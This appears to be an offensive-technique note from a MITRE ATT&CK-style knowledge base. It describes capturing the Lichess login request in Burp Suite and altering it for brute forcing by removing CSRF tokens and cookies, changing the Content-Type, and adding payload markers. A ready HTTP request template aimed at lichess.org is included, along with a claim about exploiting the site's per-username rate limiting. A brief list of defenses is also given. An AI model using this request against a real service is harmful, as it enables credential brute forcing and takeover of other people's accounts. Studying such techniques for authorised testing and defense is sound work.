---
tags:
  - request-modification
  - proxy-interception
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/lichess-login-brute-force-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:26:49.072Z'
sub_techniques: []
id: c63433cf-b80e-47ab-8c7e-ec7b054d9852
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Capture-and-Modify-Login-Request-with-Burp

## Summary

Intercept a legitimate login request using Burp Suite and modify it by removing CSRF tokens, cookies, and adjusting the Content-Type to enable payload injection for brute force.

## Description

Targeting the Lichess login vulnerability, this procedure captures the POST /login request via proxy, then alters it to bypass protections like tokens and sessions. The modified request uses multipart/form-data for form fields, with placeholders for username and password payloads. This setup exploits the per-username rate limiting by allowing varied inputs without immediate blocks.

## Requirements

1. Burp Suite Professional with Proxy and Repeater tabs
2. Captured legitimate POST /login request
3. Knowledge of HTTP request structure

## Defense

Defensive measures and detection strategies:

- Validate all requests for required tokens and headers
- Detect modified Content-Type or missing cookies
- Implement IP-based throttling on modified requests

## Objectives

1. Securely capture and replicate the login request
2. Strip security elements to prepare for automation
3. Test modified request for functionality

## Instructions

### Step 1: Intercept in Proxy

**Context**: Catch the request during form submission.

In Burp Proxy > HTTP history, locate the POST /login and send to Repeater.

### Step 2: Modify Request Structure

**Context**: Remove protections and add payloads.

Delete token parameters and Cookie headers. Change Content-Type to `multipart/form-data; boundary=----WebKitFormBoundaryc5GZocBapliqt011`. Replace username and password values with §username§ and §password§. Use [[commands/lichess-login-brute-force-request]] as the base:

```http
POST /login HTTP/2
Host: lichess.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc5GZocBapliqt011

------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="username"

§username§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="password"

§password§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="remember"

true
------WebKitFormBoundaryc5GZocBapliqt011--
```

> Send in Repeater with test values; expect 401 for invalid, confirming modifications work.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force

### Sub-Techniques


## Commands Used

- [[commands/lichess-login-brute-force-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- request-modification
- proxy-interception
